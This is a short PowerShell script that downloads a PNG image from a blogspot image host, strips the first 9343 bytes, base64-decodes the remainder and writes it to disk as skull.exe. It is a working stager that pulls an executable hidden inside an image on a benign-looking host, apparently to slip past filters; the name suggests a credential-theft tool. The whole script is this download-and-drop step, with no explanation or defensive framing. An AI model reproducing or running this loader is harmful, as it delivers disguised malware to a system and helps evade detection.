
$url = 'https://2.bp.blogspot.com/-7I8duTC1gCo/VfDuQ_Ax-kI/AAAAAAAAAT8/03qXhXigYRw/s1600/skullkatz.png'
$request = New-Object System.Net.WebCLient
$bytes = $request.DownloadData($url)
$b64 = [System.Text.Encoding]::ASCII.GetString($bytes, 9343, $bytes.Length - 9343)
$realdeal = [System.Convert]::FromBase64String($b64);
[io.file]::WriteAllBytes('c:\Tools\skull.exe',$realdeal)

